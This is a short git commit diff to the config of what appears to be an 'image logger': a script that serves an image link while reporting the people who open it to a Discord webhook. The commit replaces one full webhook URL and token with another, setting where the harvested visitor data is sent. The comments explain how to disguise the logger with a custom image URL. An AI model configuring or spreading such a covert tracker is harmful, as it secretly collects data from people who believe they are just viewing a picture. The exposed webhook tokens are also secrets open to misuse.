fdffe9148fc9ec994f645cd1a09c29eb1951b8c5
Laddervr <tyedyefloyd@icloud.com>
2025-01-31 22:59:43 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335000368186134589/nUfi8OH3IUn_o98PaVLAZuZCHjR3HprlUQWneKDvT2BbueLf3NESlaal5UK6ywrlkVSZ",
+    "webhook": "https://discord.com/api/webhooks/1335097012416286782/xbIwg8xaQ5QNnZeZFt7512lY2TJq-oOgjUjLtga6XDZtptEDzNl0SNFzyKzwTSVhPHV_",
     "image": "https://i.guim.co.uk/img/media/02088fb2247b13df646907d47f552dc69a236bc7/0_93_3235_3304/master/3235.jpg?width=1140&dpr=1&s=none&crop=none", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
